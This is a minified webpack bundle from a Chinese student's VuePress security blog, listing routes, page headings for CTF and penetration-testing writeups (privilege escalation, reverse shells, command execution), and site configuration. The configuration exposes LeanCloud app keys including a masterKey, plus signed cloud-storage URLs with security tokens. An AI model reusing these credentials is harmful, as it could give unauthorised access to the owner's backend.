"use strict";(self.webpackChunkreicalg=self.webpackChunkreicalg||[]).push([[143],{6396:(n,e,a)=>{a.d(e,{g:()=>u});var l=a(7478),r=a(5748),t=a(1598),i=a(6665),o=a(1843),s=a(8580),c=a(9146),p=a(881),g=a(1301);const m=(0,a(7621).vW)((({app:n,router:e,siteData:a})=>{})),u=[l.Z,r.Z,t.Z,i.Z,o.Z,s.Z,c.Z,p.Z,g.Z,m]},9947:(n,e,a)=>{a.d(e,{p:()=>i});var l=a(3051),r=a(8805),t=a(9796);const i=[l.Z,r.Z,t.Z]},4611:(n,e,a)=>{a.d(e,{l:()=>i});var l=a(1263),r=a(6243),t=a(7593);const i=[l.Z,r.Z,t.Z]},4150:(n,e,a)=>{a.d(e,{Z:()=>r});var l=a(6252);const r={404:(0,l.RC)((()=>Promise.all([a.e(973),a.e(431)]).then(a.bind(a,2431)))),Layout:(0,l.RC)((()=>a.e(887).then(a.bind(a,8887))))}},6056:(n,e,a)=>{a.d(e,{b:()=>r});var l=a(6252);const r={"v-4911275f":(0,l.RC)((()=>a.e(787).then(a.bind(a,1447)))),"v-5133825e":(0,l.RC)((()=>a.e(946).then(a.bind(a,6307)))),"v-2eba71ab":(0,l.RC)((()=>a.e(352).then(a.bind(a,5372)))),"v-c4be0d9c":(0,l.RC)((()=>a.e(278).then(a.bind(a,1443)))),"v-7c00b81e":(0,l.RC)((()=>a.e(852).then(a.bind(a,9559)))),"v-7db590bd":(0,l.RC)((()=>a.e(195).then(a.bind(a,4265)))),"v-1c1db1bc":(0,l.RC)((()=>a.e(566).then(a.bind(a,1099)))),"v-02eb67bd":(0,l.RC)((()=>a.e(524).then(a.bind(a,5042)))),"v-ab2961b0":(0,l.RC)((()=>a.e(225).then(a.bind(a,1212)))),"v-811949f4":(0,l.RC)((()=>a.e(871).then(a.bind(a,2812)))),"v-83363a96":(0,l.RC)((()=>a.e(883).then(a.bind(a,5699)))),"v-d8e4d770":(0,l.RC)((()=>a.e(756).then(a.bind(a,9749)))),"v-d57b2632":(0,l.RC)((()=>a.e(404).then(a.bind(a,2933)))),"v-d21174f4":(0,l.RC)((()=>a.e(135).then(a.bind(a,1631)))),"v-cea7c3b6":(0,l.RC)((()=>a.e(515).then(a.bind(a,3799)))),"v-3706649a":(0,l.RC)((()=>a.e(88).then(a.bind(a,8109)))),"v-8daa1a0e":(0,l.RC)((()=>a.e(509).then(a.bind(a,1829)))),"v-74bc627b":(0,l.RC)((()=>a.e(5).then(a.bind(a,9085)))),"v-14f724bf":(0,l.RC)((()=>a.e(69).then(a.bind(a,8784)))),"v-14e6501c":(0,l.RC)((()=>a.e(713).then(a.bind(a,779)))),"v-744d024e":(0,l.RC)((()=>a.e(146).then(a.bind(a,7034)))),"v-705c21a6":(0,l.RC)((()=>a.e(888).then(a.bind(a,8099)))),"v-6629f178":(0,l.RC)((()=>a.e(158).then(a.bind(a,7984)))),"v-031dfb13":(0,l.RC)((()=>a.e(722).then(a.bind(a,7659)))),"v-e2acc714":(0,l.RC)((()=>a.e(356).then(a.bind(a,5506)))),"v-4382d077":(0,l.RC)((()=>a.e(740).then(a.bind(a,7072)))),"v-3279cf61":(0,l.RC)((()=>a.e(118).then(a.bind(a,1973)))),"v-3c506944":(0,l.RC)((()=>a.e(219).then(a.bind(a,5455))))}},9706:(n,e,a)=>{a.d(e,{T:()=>l});const l={"v-4911275f":()=>a.e(787).then(a.bind(a,2862)).then((({data:n})=>n)),"v-5133825e":()=>a.e(946).then(a.bind(a,2530)).then((({data:n})=>n)),"v-2eba71ab":()=>a.e(352).then(a.bind(a,7677)).then((({data:n})=>n)),"v-c4be0d9c":()=>a.e(278).then(a.bind(a,6293)).then((({data:n})=>n)),"v-7c00b81e":()=>a.e(852).then(a.bind(a,2640)).then((({data:n})=>n)),"v-7db590bd":()=>a.e(195).then(a.bind(a,5338)).then((({data:n})=>n)),"v-1c1db1bc":()=>a.e(566).then(a.bind(a,1432)).then((({data:n})=>n)),"v-02eb67bd":()=>a.e(524).then(a.bind(a,8240)).then((({data:n})=>n)),"v-ab2961b0":()=>a.e(225).then(a.bind(a,87)).then((({data:n})=>n)),"v-811949f4":()=>a.e(871).then(a.bind(a,4410)).then((({data:n})=>n)),"v-83363a96":()=>a.e(883).then(a.bind(a,3452)).then((({data:n})=>n)),"v-d8e4d770":()=>a.e(756).then(a.bind(a,6004)).then((({data:n})=>n)),"v-d57b2632":()=>a.e(404).then(a.bind(a,3860)).then((({data:n})=>n)),"v-d21174f4":()=>a.e(135).then(a.bind(a,7161)).then((({data:n})=>n)),"v-cea7c3b6":()=>a.e(515).then(a.bind(a,4919)).then((({data:n})=>n)),"v-3706649a":()=>a.e(88).then(a.bind(a,1801)).then((({data:n})=>n)),"v-8daa1a0e":()=>a.e(509).then(a.bind(a,6464)).then((({data:n})=>n)),"v-74bc627b":()=>a.e(5).then(a.bind(a,2988)).then((({data:n})=>n)),"v-14f724bf":()=>a.e(69).then(a.bind(a,4770)).then((({data:n})=>n)),"v-14e6501c":()=>a.e(713).then(a.bind(a,4502)).then((({data:n})=>n)),"v-744d024e":()=>a.e(146).then(a.bind(a,6041)).then((({data:n})=>n)),"v-705c21a6":()=>a.e(888).then(a.bind(a,6762)).then((({data:n})=>n)),"v-6629f178":()=>a.e(158).then(a.bind(a,4141)).then((({data:n})=>n)),"v-031dfb13":()=>a.e(722).then(a.bind(a,8332)).then((({data:n})=>n)),"v-e2acc714":()=>a.e(356).then(a.bind(a,6790)).then((({data:n})=>n)),"v-4382d077":()=>a.e(740).then(a.bind(a,7629)).then((({data:n})=>n)),"v-3279cf61":()=>a.e(118).then(a.bind(a,8588)).then((({data:n})=>n)),"v-3c506944":()=>a.e(219).then(a.bind(a,3350)).then((({data:n})=>n))}},4634:(n,e,a)=>{a.d(e,{g:()=>r});var l=a(4802);const r=[["v-4911275f","/help.html",{},["/help","/help.md"]],["v-5133825e","/sb.html",{},["/sb","/sb.md"]],["v-2eba71ab","/xiangmusi.html",{},["/xiangmusi","/xiangmusi.md"]],["v-c4be0d9c","/misc/1.html",{},["/misc/1","/misc/1.md"]],["v-7c00b81e","/misc/misc1.html",{},["/misc/misc1","/misc/misc1.md"]],["v-7db590bd","/misc/misc2.html",{},["/misc/misc2","/misc/misc2.md"]],["v-1c1db1bc","/penetration/4.html",{},["/penetration/4","/penetration/4.md"]],["v-02eb67bd","/penetration/",{},["/penetration/index.html","/penetration/README.md"]],["v-ab2961b0","/readme/",{},["/readme/index.html","/readme/README.md"]],["v-811949f4","/tool/1.html",{},["/tool/1","/tool/1.md"]],["v-83363a96","/web/ciscn.html",{},["/web/ciscn","/web/ciscn.md"]],["v-d8e4d770","/web/web1.html",{},["/web/web1","/web/web1.md"]],["v-d57b2632","/web/web2.html",{},["/web/web2","/web/web2.md"]],["v-d21174f4","/web/web3.html",{},["/web/web3","/web/web3.md"]],["v-cea7c3b6","/web/web4.html",{},["/web/web4","/web/web4.md"]],["v-3706649a","/404.html",{},["/404"]],["v-8daa1a0e","/",{},["/index.html"]],["v-74bc627b","/about/",{},["/about/index.html"]],["v-14f724bf","/mood/",{},["/mood/index.html"]],["v-14e6501c","/link/",{},["/link/index.html"]],["v-744d024e","/tag/",{},["/tag/index.html"]],["v-705c21a6","/archive/",{},["/archive/index.html"]],["v-6629f178","/aurora-coze/",{},["/aurora-coze/index.html"]],["v-031dfb13","/register/",{},["/register/index.html"]],["v-e2acc714","/photo/",{},["/photo/index.html"]],["v-4382d077","/next-mood/",{},["/next-mood/index.html"]],["v-3279cf61","/aurora-archive/",{},["/aurora-archive/index.html"]],["v-3c506944","/aurora-music/",{},["/aurora-music/index.html"]]].reduce(((n,[e,a,r,t])=>(n.push({name:e,path:a,component:l.Y,meta:r},...t.map((n=>({path:n,redirect:a})))),n)),[{name:"404",path:"/:catchAll(.*)",component:l.Y}])},5472:(n,e,a)=>{a.d(e,{D:()=>l});const l=[{title:"forget password?",headers:[{level:3,title:"我能笑话你一年，那还能咋办,进数据库自己看",slug:"我能笑话你一年-那还能咋办-进数据库自己看",children:[]}],path:"/help.html",pathLocale:"/",extraFields:[]},{title:"服务协议？隐私政策?",headers:[{level:3,title:"这种破网站哪来隐私政策和服务协议？先笑话你一年",slug:"这种破网站哪来隐私政策和服务协议-先笑话你一年",children:[]}],path:"/sb.html",pathLocale:"/",extraFields:[]},{title:"项目四",headers:[],path:"/xiangmusi.html",pathLocale:"/",extraFields:[]},{title:"misc刷题（杂七杂八）",headers:[{level:2,title:"[CISCN 2022 初赛]ez_usb",slug:"ciscn-2022-初赛-ez-usb",children:[]},{level:2,title:"[CISCN 2018]Picture",slug:"ciscn-2018-picture",children:[]},{level:2,title:"[CISCN 2023 初赛]被加密的生产流量",slug:"ciscn-2023-初赛-被加密的生产流量",children:[]},{level:2,title:"[CISCN 2022 初赛]everlasting_night",slug:"ciscn-2022-初赛-everlasting-night",children:[]},{level:2,title:"[CISCN 2021初赛]running_pixel",slug:"ciscn-2021初赛-running-pixel",children:[]}],path:"/misc/1.html",pathLocale:"/",extraFields:[]},{title:"misc刷题（信息附加）",headers:[{level:2,title:"信息附加",slug:"信息附加",children:[{level:3,title:"Misc3",slug:"misc3",children:[]},{level:3,title:"misc5",slug:"misc5",children:[]},{level:3,title:"misc6",slug:"misc6",children:[]},{level:3,title:"misc7",slug:"misc7",children:[]},{level:3,title:"misc8",slug:"misc8",children:[]},{level:3,title:"misc9",slug:"misc9",children:[]},{level:3,title:"misc10",slug:"misc10",children:[]},{level:3,title:"misc11",slug:"misc11",children:[]},{level:3,title:"misc12",slug:"misc12",children:[]},{level:3,title:"misc13",slug:"misc13",children:[]},{level:3,title:"misc14",slug:"misc14",children:[]},{level:3,title:"misc15",slug:"misc15",children:[]},{level:3,title:"misc16",slug:"misc16",children:[]},{level:3,title:"misc17",slug:"misc17",children:[]},{level:3,title:"misc18",slug:"misc18",children:[]},{level:3,title:"misc19",slug:"misc19",children:[]},{level:3,title:"misc20",slug:"misc20",children:[]},{level:3,title:"misc21",slug:"misc21",children:[]},{level:3,title:"misc22",slug:"misc22",children:[]},{level:3,title:"misc23",slug:"misc23",children:[]}]},{level:2,title:"信息附加的总结：",slug:"信息附加的总结",children:[]}],path:"/misc/misc1.html",pathLocale:"/",extraFields:[]},{title:"misc刷题（文件结构）",headers:[{level:2,title:"文件结构",slug:"文件结构",children:[{level:3,title:"misc24",slug:"misc24",children:[]},{level:3,title:"misc25",slug:"misc25",children:[]},{level:3,title:"misc26",slug:"misc26",children:[]},{level:3,title:"misc27",slug:"misc27",children:[]},{level:3,title:"misc28",slug:"misc28",children:[]},{level:3,title:"misc29",slug:"misc29",children:[]},{level:3,title:"misc30",slug:"misc30",children:[]},{level:3,title:"misc31",slug:"misc31",children:[]},{level:3,title:"misc32",slug:"misc32",children:[]},{level:3,title:"misc33",slug:"misc33",children:[]},{level:3,title:"misc34",slug:"misc34",children:[]},{level:3,title:"miscc35",slug:"miscc35",children:[]},{level:3,title:"misc36",slug:"misc36",children:[]},{level:3,title:"misc37",slug:"misc37",children:[]},{level:3,title:"misc38",slug:"misc38",children:[]},{level:3,title:"misc39",slug:"misc39",children:[]}]}],path:"/misc/misc2.html",pathLocale:"/",extraFields:[]},{title:"暗月项目四（完整渗透测试）",headers:[{level:3,title:"项目四（完整渗透测试）",slug:"项目四-完整渗透测试",children:[]},{level:2,title:"主机扫描",slug:"主机扫描",children:[{level:3,title:"(1)nmap-sn",slug:"_1-nmap-sn",children:[]},{level:3,title:"(2)netdiscover -i",slug:"_2-netdiscover-i",children:[]}]},{level:2,title:"端口扫描",slug:"端口扫描",children:[]},{level:2,title:"改dns服务器地址",slug:"改dns服务器地址",children:[]},{level:2,title:"wfuzz爆破子域名",slug:"wfuzz爆破子域名",children:[]},{level:2,title:"第一个网站的渗透（new.）",slug:"第一个网站的渗透-new",children:[]},{level:2,title:"第二个域名渗透（ww2）",slug:"第二个域名渗透-ww2",children:[{level:3,title:"gobuster 目录扫描",slug:"gobuster-目录扫描",children:[]},{level:3,title:"sql注入漏洞",slug:"sql注入漏洞",children:[]}]}],path:"/penetration/4.html",pathLocale:"/",extraFields:[]},{title:"渗透测试提权",headers:[{level:2,title:"提权篇",slug:"提权篇",children:[{level:3,title:"内核漏洞提权",slug:"内核漏洞提权",children:[]},{level:3,title:"Suid提权",slug:"suid提权",children:[]},{level:3,title:"GNU C library动态链接区$ORIGIN溢出提权",slug:"gnu-c-library动态链接区-origin溢出提权",children:[]},{level:3,title:"LINUX CRON JOBS提权",slug:"linux-cron-jobs提权",children:[]},{level:3,title:"Lpk提权",slug:"lpk提权",children:[]},{level:3,title:"zend nc提权",slug:"zend-nc提权",children:[]},{level:3,title:"Zend 反弹shell提权",slug:"zend-反弹shell提权",children:[]},{level:3,title:"Filezilla提权",slug:"filezilla提权",children:[]}]}],path:"/penetration/",pathLocale:"/",extraFields:[]},{title:"写在建站之初",headers:[],path:"/readme/",pathLocale:"/",extraFields:[]},{title:"相关工具使用（未整理版）",headers:[{level:2,title:"反弹加提权的一般步骤",slug:"反弹加提权的一般步骤",children:[]},{level:2,title:"后渗透",slug:"后渗透",children:[{level:3,title:"模块利用",slug:"模块利用",children:[]},{level:3,title:"cmd命令",slug:"cmd命令",children:[]}]},{level:2,title:"文件格式",slug:"文件格式",children:[{level:3,title:"文件头和文件尾",slug:"文件头和文件尾",children:[]}]}],path:"/tool/1.html",pathLocale:"/",extraFields:[]},{title:"ciscn初赛刷题",headers:[{level:3,title:"unzip",slug:"unzip",children:[]}],path:"/web/ciscn.html",pathLocale:"/",extraFields:[]},{title:"命令执行刷题",headers:[{level:2,title:"命令执行",slug:"命令执行",children:[{level:3,title:"Web29-37",slug:"web29-37",children:[]},{level:3,title:"Web39",slug:"web39",children:[]},{level:3,title:"Web40",slug:"web40",children:[]},{level:3,title:"Web43",slug:"web43",children:[]},{level:3,title:"Web44",slug:"web44",children:[]},{level:3,title:"Web45",slug:"web45",children:[]},{level:3,title:"Web46",slug:"web46",children:[]},{level:3,title:"Web47",slug:"web47",children:[]},{level:3,title:"Web48",slug:"web48",children:[]},{level:3,title:"Web49",slug:"web49",children:[]},{level:3,title:"Web50",slug:"web50",children:[]},{level:3,title:"Web51",slug:"web51",children:[]},{level:3,title:"Web52",slug:"web52",children:[]},{level:3,title:"Web53",slug:"web53",children:[]},{level:3,title:"Web54",slug:"web54",children:[]},{level:3,title:"Web55",slug:"web55",children:[]},{level:3,title:"Web56",slug:"web56",children:[]},{level:3,title:"Web57",slug:"web57",children:[]},{level:3,title:"Web58",slug:"web58",children:[]},{level:3,title:"Web59",slug:"web59",children:[]},{level:3,title:"Web60",slug:"web60",children:[]},{level:3,title:"Web61 62",slug:"web61-62",children:[]},{level:3,title:"Web66",slug:"web66",children:[]},{level:3,title:"Web67",slug:"web67",children:[]},{level:3,title:"Web68",slug:"web68",children:[]},{level:3,title:"Web70",slug:"web70",children:[]},{level:3,title:"Web71",slug:"web71",children:[]},{level:3,title:"Web72",slug:"web72",children:[]},{level:3,title:"Web73",slug:"web73",children:[]},{level:3,title:"Web74",slug:"web74",children:[]},{level:3,title:"Web75",slug:"web75",children:[]}]}],path:"/web/web1.html",pathLocale:"/",extraFields:[]},{title:"文件上传刷题",headers:[{level:2,title:"文件上传",slug:"文件上传",children:[]},{level:2,title:"Web151",slug:"web151",children:[{level:3,title:"Web152",slug:"web152",children:[]},{level:3,title:"Web153",slug:"web153",children:[]},{level:3,title:"Web154",slug:"web154",children:[]},{level:3,title:"Web155",slug:"web155",children:[]},{level:3,title:"web156",slug:"web156",children:[]},{level:3,title:"web157",slug:"web157",children:[]},{level:3,title:"web158",slug:"web158",children:[]},{level:3,title:"web159",slug:"web159",children:[]},{level:3,title:"web160",slug:"web160",children:[]}]}],path:"/web/web2.html",pathLocale:"/",extraFields:[]},{title:"php特性刷题",headers:[{level:2,title:"php特性",slug:"php特性",children:[{level:3,title:"Web89",slug:"web89",children:[]},{level:3,title:"Web90",slug:"web90",children:[]},{level:3,title:"Web91",slug:"web91",children:[]},{level:3,title:"Web92",slug:"web92",children:[]},{level:3,title:"Web93",slug:"web93",children:[]},{level:3,title:"Web94",slug:"web94",children:[]},{level:3,title:"Web95",slug:"web95",children:[]},{level:3,title:"Web96",slug:"web96",children:[]},{level:3,title:"Web97",slug:"web97",children:[]},{level:3,title:"Web98",slug:"web98",children:[]},{level:3,title:"Web99",slug:"web99",children:[]},{level:3,title:"Web100",slug:"web100",children:[]},{level:3,title:"web101",slug:"web101",children:[]},{level:3,title:"Web102",slug:"web102",children:[]}]}],path:"/web/web3.html",pathLocale:"/",extraFields:[]},{title:"文件包含刷题",headers:[{level:2,title:"文件包含",slug:"文件包含",children:[{level:3,title:"web78",slug:"web78",children:[]},{level:3,title:"Web79",slug:"web79",children:[]},{level:3,title:"Web80",slug:"web80",children:[]},{level:3,title:"Web81",slug:"web81",children:[]}]}],path:"/web/web4.html",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/404.html",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/about/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/mood/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/link/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/tag/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/archive/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/aurora-coze/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/register/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/photo/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/next-mood/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/aurora-archive/",pathLocale:"/",extraFields:[]},{title:"",headers:[],path:"/aurora-music/",pathLocale:"/",extraFields:[]}]},5220:(n,e,a)=>{a.d(e,{H:()=>l});const l={base:"/",lang:"zh-CN",title:"reicalg的小破站",description:"",head:[["script",{src:"https://at.alicdn.com/t/font_2849934_v6y652peian.js"}],["link",{href:"/logo.png",rel:"icon"}],["link",{rel:"stylesheet",type:"text/css",href:"//at.alicdn.com/t/font_2932340_r7zitafg82.css"}]],locales:{}}},2232:(n,e,a)=>{a.d(e,{f:()=>l});const l={navbar:[{text:"起点",link:"/readme/",iconClass:"aurora-navbar-si-glyph-dial-number-1"},{text:"你这个年纪不刷题？",iconClass:"aurora-navbar-blaze-line",children:[{text:"misc",children:["/misc/misc1.md","/misc/misc2.md","/misc/1.md"]},{text:"web",children:["/web/ciscn.md","/web/web1.md","/web/web4.md"]}]},{text:"渗透测试",iconClass:"aurora-navbar-weather",children:[{children:["/penetration/4.md"],text:"渗透项目实例"},{children:["/penetration/"],text:"提权"}]},{text:"各类工具使用",iconClass:"aurora-navbar-si-glyph-egg",children:[{children:["/tool/1.md"],text:"渗透工具"}]},{text:"life",iconClass:"aurora-navbar-hua2",children:[{children:[{text:"Me",link:"/about"}],text:"我?"},{text:"相册",children:[{text:"photo",link:"/photo"}]}]},{text:"page",iconClass:"aurora-navbar-a-ziyuan107",children:[{text:"标签",children:[{text:"tag",link:"/tag"}]},{text:"时间轴",children:[{text:"archive",link:"/archive"}]}]},{text:"Reicalg",link:"https://github.com/reicalg2003/",iconClass:"aurora-navbar-github1"}],darkMode:!1,repo:"https://github.com/qsyyke/vuepress-theme-aurora",repoIconClass:"aurora-navbar-github",docsRepo:"https://github.com/qsyyke/aurora-docs",githubActions:!1,docsBranch:"main",repoLabel:"Aurora-theme",editLink:!0,editLinkText:"edit",lastUpdated:!0,lastUpdatedText:"lastTime",logoColor:"#2c3e50",showFont:"ZZZ",heroImg:"/logo.jpg",logo:"/logo/logo3.jpg",lazyLoadingImg:"/ljz.gif",homePageLazyLoadingImg:"/aurora-loading.gif",customRandomSay:!1,customRandomValue:"jqc i love u ",socials:[{aHref:"tencent://message/?uin=2316723995",isHome:!0,show:!0,sidebar:!0,symbol:"#icon-qq"},{aHref:"javascript:;",showImgSrc:"/ma/wechat.jpg",isHome:!0,show:!0,symbol:"#icon-weixin",sidebar:!0},{aHref:"https://github.com/reicalg2003/",isHome:!0,show:!0,sidebar:!0,symbol:"#icon-github-fill"},{aHref:"https://space.bilibili.com/1902122083",isHome:!0,show:!0,sidebar:!0,symbol:"#icon-bilibili-1"},{aHref:"https://music.163.com/#/user/home?id=1926161991",isHome:!0,show:!0,symbol:"#icon-wangyiyunyinle",sidebar:!0},{aHref:"mailto:2316723995@qq.com",isHome:!0,show:!0,sidebar:!0,symbol:"#icon-email"}],logoTitle:"Reicalg",headTitle:"this is headTitle",description:"reicalg",keyword:"vuepress主题,vuepress theme,生活琐事,二次元博客,简约博客,博客主题,静态主题",slideTime:3e5,randomSaw:"https://international.v1.hitokoto.cn/?c=b&max_length=45",about:[{bar:!1,title:"reicalg",describe:["啥也不会的社畜","大二学生,网络安全专业,坐标南京浦口","喜欢安静,不喜社交，最喜欢和最喜欢的人呆在一起","喜欢听音乐,ずっと真夜中でいいのに yyds好吧","喜欢技术,特别是能搞些小破坏的技能","目前正在学习渗透，前端开发","主题是借鉴别人的，如果有可能当然希望开发一个自己的主题","懒癌晚期","除了吃好吃的外没有什么兴趣爱好","2.5次元，原先挺喜欢看番，但是现在没有原先那么积极了","现在在看《这么多年》，小说比电影好看多了"]},{bar:!1,title:"大三规划",describe:["做大创","两个中软","英语六级！！！","出去旅游","继续学习渗透","做点什么有意义的事"]},{bar:!1,title:"未来规划",describe:["按部就班","赚money"]},{bar:!0,showTag:!1,title:"掌握技能",describe:[{name:"vue",score:50},{name:"linux",score:68},{name:"git",score:78},{name:"Ctrl C V",score:100}]}],randomColor:["#ffcad4","#d8e2dc","#8d99ae","#b8f2e6","#84c7d0","#aed9e0","#00b4d8","#caf0f8","#fbc4ab","#fdc5f5","#84dcc6","#a9def9","#fcf6bd","#f0a6ca","#b9faf8","#42a5f5","#ff9800","#b39ddb","#6d45bb","#b388ff","#1565c0","#26c6da","#5e548e","#90f1ef","#5b5f97","#bbe6e4","#42bfdd","#72ddf7","#8093f1","#9ed8d8","#7ea8be","#ef90b3","#b892ef","#c0b9dd","#c0d9dd","#75c9c8","#ded9e2","#b5e2fa","#62b6cb","#5fa8d3","#0fa3b1","#b5e2fa","#5fa8d3","#62b6cb","#b892ff"],maxFontColorArr:8,fontColor:["#2c3e50","#42a5f5","#8093f1","#FF6EC7","#FF7F00","#8FBC8F","#EAADEA","#3299CC","#CDCDCD","#CC3299","#FF7F00","#2F4F4F"],siteInformation:{title:"reicalg",url:"https://reicalg2003.github.io",logo:"/logo.jpg",describe:"reicalg 的小小窝",cover:"/my-cover.png",contact:"email: cqycco@gmail.com, qq:2291308094",otherDescribe:["申请友链请按照下面格式，在此页面留言，我看到就会进行添加","博客名称    博客地址      博客描述      博客logo","友链申请要求","拒绝涉政/涉黄/太多广告/盈利性站点","站点能正常访问"]},fontFamily:["-apple-system","hlt","tzt","sst","lf","xsf","lsf","cgt"],footer:["Copyright © by reicalg"],isShowFooter:!0,isShowThemeCopyright:!1,isShowRunTime:!0,startRunTime:"2/9/2018 00:00:00",prefixRuntime:"重要的事已经发生",message:["你先别急，让我先急，急急急","慢慢写，慢慢更，一点也不着急"],recommendPageLength:30,recommendNoTitle:"`╮(￣▽￣)╭`",tagNoTitle:"暂时还没有标题哟",mood:"哦吼哦吼吼",isFitter:!0,defaultBorderRadius:10,defaultOpacity:.76,isHomePageFollow:!1,defaultBlur:1,split:"~",donate:{donateImg:["/ma/pay1.jpg","/ma/pay2.jpg"],articlePage:!0,aboutPage:!0,donateProduct:[{name:"奶茶",img:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/naicha.jpg?q-sign-algorithm=sha1&q-ak=AKID0Jc3o1LWnnZajyzdK69rT8G_t4cDqi1RtaCFrZfPeOgn0-yvNiCuagNbjUvMopAI&q-sign-time=1684759427;1684763027&q-key-time=1684759427;1684763027&q-header-list=host&q-url-param-list=&q-signature=465f92ec1c3399fc8034ffeed4d032fde1555654&x-cos-security-token=2f16ZUVk9EQCfAzfx1Uj5K62HdDFkDpad10d3ecd34065332573ed04264039b46S_CHodDmKkI3PBAv0gWbg78UXKPrv-JVOCPWW5t4GeywTdwDS-t0ukE7mKHOVURk0rJoBrqXwuKFRbJ76GEHGc3AJSytmsCUDep8EIontqkfR5DHmSlE7QaU6MPinizqDVCy6Gn6zZcFp5siYYGAkjnAQ231gJAobh9De1ZqNhlnZasApl90-cOD7YE6yTKW",price:18,prefix:"$"},{name:"小熊饼干",img:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/xiaoxiongbinggan.jpg?q-sign-algorithm=sha1&q-ak=AKIDgCe12v6uBA6HZMuXfzWcRg67T8AbiM0Gpg001gr7GS-RfCjcNATeZzr3bPguM0S8&q-sign-time=1684759372;1684762972&q-key-time=1684759372;1684762972&q-header-list=host&q-url-param-list=&q-signature=dccbb9a652444c0052f0a9bb0e19e3a8565ba79b&x-cos-security-token=2f16ZUVk9EQCfAzfx1Uj5K62HdDFkDpabb4b3322551e993d3e919620626d9fcdS_CHodDmKkI3PBAv0gWbgybCh8Qbc-eRbqqdwxGu2vbBFBH-EfgGt2QACHz2CloJWaKwFsPmPNQ_AYgD_UZMShCJrNYQtZeYc2GcJ_ghygzmTSjlbwts5FVsruzJZVgaUEFjhhMWcwfs4Qbq1dInFL5CxwB7j_P-Zu66cYaDeZcnUQhrSif07cMKs1OtAKBp",price:11,prefix:"￥"}],donateList:[{name:"奶茶饿了吗",msg:"宝宝太棒了",img:"/logo/logo2.jpg",price:520,prefix:"￥"}]},comment:{showComment:!0,serverURL:"https://aurora-local-7hrjb6mp8-qsyyke.vercel.app/",emojis:["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/alus","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/tieba","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/weibo"],avatar:"monsterid"},poster:{description:"啥也不会的reicalg分享他的一些无用知识",author:"卑微的reicalg",preBlog:"Reicalg",suffixBlog:" blog",avatar:"/logo.jpg"},showOnlineMood:!0,showMoodEdit:!1,addMood:{siteName:"localhost:8080",appId:"q4LlYVTTk2r39sNrJr7BL9A6p",appKey:"VxezWTppppyX2LTx4TUK8w6e2"},customTopImg:{custom:!0,page:["/bg/555260.png","/bg/404901.png","/bg/734386.png"],friend:["/bg/669.png","/bg/5332.png"],tag:["/bg/763311.png"],mood:["/bg/5849.png"]},homeWps:["https://blog-1318287398.cos.ap-nanjing.myqcloud.com/bg/bg1.png","https://blog-1318287398.cos.ap-nanjing.myqcloud.com/bg/1.png"],homeWpsMobile:["https://blog-1318287398.cos.ap-nanjing.myqcloud.com/bg/bg1.png","https://blog-1318287398.cos.ap-nanjing.myqcloud.com/bg/1.png"],pageSize:4,githubUrl:"https://github.com/reiclag2003/",latestPageSize:5,showHomePageImg:!1,sidebarCatalogLevel:3,homePageImgApi:"https://api.dujin.org/pic/ghibli/ceqt",mobileCutText:"Reicalg",sidebarTag:"categories",showAddMood:!0,postImgApi:"https://picture.cco.vin/pic/rmimg?type=bing",articleH2Icon:"😊",articleH3Icon:"😂",articleH4Icon:"🤣",sidebarAvatar:"/logo.jpg",sugCountPerMin:300,showRecommend:!0,articlePagination:!0,global:{sidebar:{showStatus:!0,perData:!1,social:!1,friendLink:!0,navbar:!1,latestPage:!0,message:!1,tag:!0,siteData:!1},footer:!1},excludePath:["/footer.html","/v1.3.0/","/plugin/","/node.html","/style.html"],categoriesIncludeFolderName:!1,wave:{showWave:!0},bubble:{show:!0,bubbleNumber:.14,bubbleAlpha:.63,alphaChangeSpeed:1e-5,size:.4,sizeChangeSpeed:2e-4,riseSpeed:.4,color:"255,255,255"},leanCloud:{appId:"2A2Dyd2AffrnldhwftlEddVn-MdYXbMMI",appKey:"qHYTbb91iOPLelyC9lpbXxLH",masterKey:"eUwfvS3luIPnPiHS5SpEhDYr"},showPageMeta:!0,randomSayApi:{method:"GET",urlApi:"https://v1.hitokoto.cn/?encode=text&c=a"},afDianUrl:"https://afdian.net/@qsyyke",homeTopText:"置顶",sidebarDesc:"啥也不会，别骂了，已经在学了",showAboutPageBubble:!0,locales:{"/":{selectLanguageName:"English"}},selectLanguageText:"Languages",selectLanguageAriaLabel:"Select language",sidebar:"auto",sidebarDepth:2,contributors:!0,contributorsText:"Contributors",notFound:["There's nothing here.","How did we get here?","That's a Four-Oh-Four.","Looks like we've got some broken links."],backToHome:"Take me home",openInNewWindow:"open in new window"}},4125:(n,e,a)=>{a.d(e,{Z:()=>l});const l=[{data:{key:"v-4911275f",path:"/help.html",title:"forget password?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"我能笑话你一年，那还能咋办,进数据库自己看",slug:"我能笑话你一年-那还能咋办-进数据库自己看",children:[]}],git:{}},key:"v-4911275f",path:"/help.html",title:"forget password?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"我能笑话你一年，那还能咋办,进数据库自己看",slug:"我能笑话你一年-那还能咋办-进数据库自己看",children:[]}],content:"\r\n# forget password?\r\n\r\n### 我能笑话你一年，那还能咋办,进数据库自己看\r\n\r\n",contentRendered:'<h1 id="forget-password" tabindex="-1"><a class="header-anchor" href="#forget-password" aria-hidden="true">#</a> forget password?</h1>\n<h3 id="我能笑话你一年-那还能咋办-进数据库自己看" tabindex="-1"><a class="header-anchor" href="#我能笑话你一年-那还能咋办-进数据库自己看" aria-hidden="true">#</a> 